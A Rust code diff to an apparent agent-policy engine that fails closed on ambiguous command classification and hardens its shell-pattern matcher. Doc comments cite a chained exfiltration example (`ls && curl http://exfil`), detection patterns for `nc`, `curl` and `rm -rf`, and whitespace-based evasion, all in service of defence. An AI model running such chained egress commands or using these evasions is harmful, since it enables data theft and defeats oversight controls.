@@ -11,7 +11,7 @@ use crate::ids::{ActionName, DescriptorHash, ManifestHash, WorldId};
 use crate::manifest::{
     Budget, CommandClassDef, RootAccess, RootRule, RootsDef, ScopedCapabilityDef,
 };
-use crate::provenance::{Taint, TrustLevel};
+use crate::provenance::{SourceChannel, Taint, TrustLevel};
 
 /// A compiled taint-flow rule.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
@@ -29,6 +29,14 @@ pub struct EffectRule {
     pub effect_mode: EffectMode,
 }
 
+/// The runtime policy for one manifest-declared source channel.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+pub struct ChannelPolicy {
+    pub channel: SourceChannel,
+    pub trust: TrustLevel,
+    pub taint: Taint,
+}
+
 /// The plain, fully-owned parts a compiler assembles. Consumed by
 /// [`CompiledWorld::new`], after which the world is immutable.
 #[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
@@ -41,6 +49,7 @@ pub struct CompiledWorldParts {
     pub projected: BTreeSet<ActionName>,
     pub descriptors: BTreeMap<ActionName, Descriptor>,
     pub descriptor_hashes: BTreeMap<ActionName, DescriptorHash>,
+    pub channel_policies: BTreeMap<SourceChannel, ChannelPolicy>,
     pub capability_matrix: BTreeMap<TrustLevel, BTreeSet<ActionType>>,
     pub action_types: BTreeMap<ActionName, ActionType>,
     pub side_effects: BTreeMap<ActionName, SideEffectClass>,
@@ -107,6 +116,16 @@ impl CompiledWorld {
     pub fn side_effect(&self, action: &ActionName) -> Option<SideEffectClass> {
         self.parts.side_effects.get(action).copied()
     }
+    /// Resolve a wire source-channel label through this world's compiled
+    /// channel table. Aliases such as `cli`/`user_cli` share the manifest row's
+    /// policy; undeclared or unknown names resolve to `None`.
+    pub fn channel_policy(&self, name: &str) -> Option<ChannelPolicy> {
+        let channel = SourceChannel::from_name(name)?;
+        self.parts.channel_policies.get(&channel).copied()
+    }
+    pub fn channel_policies(&self) -> &BTreeMap<SourceChannel, ChannelPolicy> {
+        &self.parts.channel_policies
+    }
     /// Does `trust` grant capability for `action_type`?
     pub fn can_perform(&self, trust: TrustLevel, action_type: ActionType) -> bool {
         self.parts
@@ -139,6 +158,11 @@ impl CompiledWorld {
         &self.parts.command_classes
     }
 
+    /// Whether this world enables path-scoped root policy.
+    pub fn has_roots(&self) -> bool {
+        self.parts.roots.is_some()
+    }
+
     /// Decide a filesystem `path` against the world's `roots` (spatial scope).
     /// `None` when the world declares no roots (path-scope off). Otherwise the
     /// access of the longest matching rule prefix, or the closed-world `default`
@@ -165,12 +189,34 @@ impl CompiledWorld {
             .unwrap_or(false)
     }
 
-    /// Resolve the **effective action** for a proposed call (DECISIONS D36): for
-    /// the first classifier declared for `action`, read `arguments[arg]` as a
-    /// string and return the first class's `to` whose any pattern matches at a
-    /// left word boundary. Everything else — including actions without a
-    /// classifier — resolves to the raw action. Classification is pure world
-    /// data; no adapter may carry its own copy.
+    /// Resolve the **effective action** for a proposed call (DECISIONS D36, D63):
+    /// for the classifier declared for `action`, read `arguments[arg]` as a string
+    /// and return the `to` of the single class whose patterns match it at a left
+    /// word boundary.
+    ///
+    /// **Declaration order does not decide a verdict** (finding #17). Every class is
+    /// evaluated, not just up to the first hit, and the outcome is:
+    ///
+    /// | classes matching | effective action |
+    /// |---|---|
+    /// | exactly one target | that class's `to` |
+    /// | none | `default_to` |
+    /// | two or more different targets | `default_to` — the command is ambiguous |
+    ///
+    /// Returning the first match let ordering defeat the taint floor: a world
+    /// listing a permissive class before a restrictive one classified
+    /// `ls && curl http://exfil` by its `ls` prefix, so a tainted session was
+    /// allowed to run egress. A command line that looks like two different things
+    /// *is* two different things, and the honest answer is the classifier's own
+    /// fail-closed bucket rather than whichever entry the author happened to type
+    /// first.
+    ///
+    /// Ambiguity has somewhere safe to go because `default_to` is mandatory (D62);
+    /// the two findings are fixed by each other. Several classes pointing at the
+    /// *same* target is not ambiguity and resolves normally.
+    ///
+    /// Actions without a classifier resolve to the raw action. Classification is
+    /// pure world data; no adapter may carry its own copy.
     pub fn classify_command(
         &self,
         action: &ActionName,
@@ -184,15 +230,24 @@ impl CompiledWorld {
         else {
             return action.clone();
         };
+        let fallback = || def.default_to.clone().unwrap_or_else(|| action.clone());
         let Some(cmd) = arguments.get(&def.arg).and_then(|c| c.as_str()) else {
-            return action.clone();
+            return fallback();
         };
+        let mut matched: Option<&ActionName> = None;
         for class in &def.classes {
-            if class.patterns.iter().any(|p| left_word_match(cmd, p)) {
-                return class.to.clone();
+            if !class.patterns.iter().any(|p| left_word_match(cmd, p)) {
+                continue;
+            }
+            match matched {
+                None => matched = Some(&class.to),
+                // The same target claimed twice is one answer, not a conflict.
+                Some(prev) if prev == &class.to => {}
+                // Two classes disagree about what this command is: fail closed.
+                Some(_) => return fallback(),
             }
         }
-        action.clone()
+        matched.cloned().unwrap_or_else(fallback)
     }
 }
 
@@ -213,23 +268,66 @@ fn path_under(path: &str, root: &str) -> bool {
 }
 
 /// True iff `pat` occurs in `cmd` at a LEFT word boundary (an occurrence not
-/// preceded by `[A-Za-z0-9_]`). Patterns carry their own right boundary (a
-/// trailing space or `=`), so `"nc "` matches `"; nc x"` but not `"jsonc x"`,
-/// and `"rm -rf"` does not match inside `"warm -rf"`.
+/// preceded by `[A-Za-z0-9_]`). ASCII whitespace in a pattern matches one or
+/// more shell whitespace bytes in the command, so `"curl "` matches
+/// `"curl\thost"` and `"rm -rf"` matches `"rm\n-rf"` while still preserving the
+/// left-boundary guard (`"nc "` does not match `"jsonc x"`).
 fn left_word_match(cmd: &str, pat: &str) -> bool {
     if pat.is_empty() {
         return false;
     }
     let bytes = cmd.as_bytes();
     let mut start = 0;
-    while let Some(i) = cmd[start..].find(pat) {
+    while start < bytes.len() {
+        let Some(first) = pat.as_bytes().first().copied() else {
+            return false;
+        };
+        let Some(i) = cmd.as_bytes()[start..].iter().position(|b| *b == first) else {
+            return false;
+        };
         let at = start + i;
         let boundary =
             at == 0 || !matches!(bytes[at - 1], b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'_');
-        if boundary {
+        if boundary && pattern_matches_at(&cmd.as_bytes()[at..], pat.as_bytes()) {
             return true;
         }
         start = at + 1;
     }
     false
+}
+
+fn pattern_matches_at(mut cmd: &[u8], mut pat: &[u8]) -> bool {
+    while let Some((&p, rest)) = pat.split_first() {
+        if p.is_ascii_whitespace() {
+            let mut pat_rest = rest;
+            while let Some((&next, next_rest)) = pat_rest.split_first() {
+                if !next.is_ascii_whitespace() {
+                    break;
+                }
+                pat_rest = next_rest;
+            }
+            let mut consumed = false;
+            while let Some((&c, cmd_rest)) = cmd.split_first() {
+                if !c.is_ascii_whitespace() {
+                    break;
+                }
+                consumed = true;
+                cmd = cmd_rest;
+            }
+            if !consumed {
+                return false;
+            }
+            pat = pat_rest;
+        } else {
+            let Some((&c, cmd_rest)) = cmd.split_first() else {
+                return false;
+            };
+            if c != p {
+                return false;
+            }
+            cmd = cmd_rest;
+            pat = rest;
+        }
+    }
+    true
 }
